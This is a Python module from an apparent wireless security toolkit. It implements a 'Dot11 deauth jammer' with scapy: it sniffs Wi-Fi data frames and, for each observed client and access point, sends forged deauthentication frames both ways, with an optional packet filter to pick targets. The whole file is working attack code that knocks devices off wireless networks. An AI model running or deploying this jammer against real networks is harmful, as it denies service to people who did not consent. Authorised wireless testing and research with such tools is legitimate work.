from scapy.all import (
    AsyncSniffer,
    Dot11,
    Dot11Deauth,
    RadioTap,
    conf,
    get_if_hwaddr,
    sendp,
)

from src.envena.core.arguments import public_args
from src.envena.core.basetool import BaseTool
from src.envena.core.protocols.dot11 import Dot11Packet, Dot11PacketType
from src.envena.modules.dot11.attack import CATEGORY_DOC
from src.envena.utils.validators import validate_bpf

sent_packets = 0


def send_deauth(bssid, eth_src, iface) -> bool:
    dot11 = Dot11(addr1=eth_src, addr2=bssid, addr3=bssid)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    try:
        sendp(packet, iface=iface, count=1, verbose=0)
        return True
    except:
        return False


def process_pkt(pkt, logger, hw_src, iface) -> None:
    global sent_packets
    if pkt.haslayer(Dot11):
        if pkt.type == 2 and pkt.addr2 != hw_src:
            # packet = Dot11Packet(iface=iface, count=1, timeout=0, hw_src=pkt.addr1, hw_dst=pkt.addr2,
            #  packet_type=Dot11PacketType.DEAUTH, bssid=pkt.addr3)

            # packet.send_packet(verbose=0)
            if send_deauth(
                bssid=pkt.addr1, eth_src=pkt.addr2, iface=iface
            ) and send_deauth(eth_src=pkt.addr1, bssid=pkt.addr2, iface=iface):
                sent_packets += 1
                logger.info(
                    f"{sent_packets}...Sent deauth frames: {pkt.addr2} <-> {pkt.addr1}"
                )


def jammer(param, logger) -> None:
    try:
        global sent_packets
        iface = param.iface if param.iface else str(conf.iface)
        hw_src = get_if_hwaddr(iface)
        if not validate_bpf(param.input):
            logger.fatal('Incorrect BPF. Check up your "filter" option')
            return
        user_filter = f" and ({param.input})" if param.input != "" else ""
        data_filter = "wlan type data" + user_filter

        sniffer = AsyncSniffer(
            iface=iface,
            prn=lambda pkt: process_pkt(
                pkt=pkt, logger=logger, iface=iface, hw_src=hw_src
            ),
            filter=data_filter,
            store=0,
        )

        sniffer.start()

        logger.info("Waiting for target(s) data frames...")
        logger.info("Press Enter or Ctrl+C to stop")

        input()
        raise KeyboardInterrupt

    except KeyboardInterrupt:
        if sniffer.running:
            sniffer.stop()
        logger.info(
            f"Jammer was stopped. {sent_packets} deauthentication packet(s) sent. (Total: {sent_packets * 2})"
        )


class t_jammer(BaseTool):
    def __init__(self, tool_func=jammer, VERSION=1.0):
        super().__init__(tool_func=tool_func, VERSION=VERSION)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Dot11 deauth jammer")
    parser.add_argument(
        "-i",
        "--iface",
        help="work interface",
        required=False,
        default=str(conf.iface),
        type=str,
    )
    parser.add_argument(
        "-f",
        "--filter",
        help="Berkeley packet filter that will used to traffic. Can be used as whitelist. Example: 'wlan host <MAC_ADDRESS>' if you want to jam only one WLAN",
        required=False,
        default="",
        type=str,
    )

    cli_args = parser.parse_args()
    public_args.iface = cli_args.iface
    public_args.input = cli_args.filter.lower()

    t_jammer().start_tool()
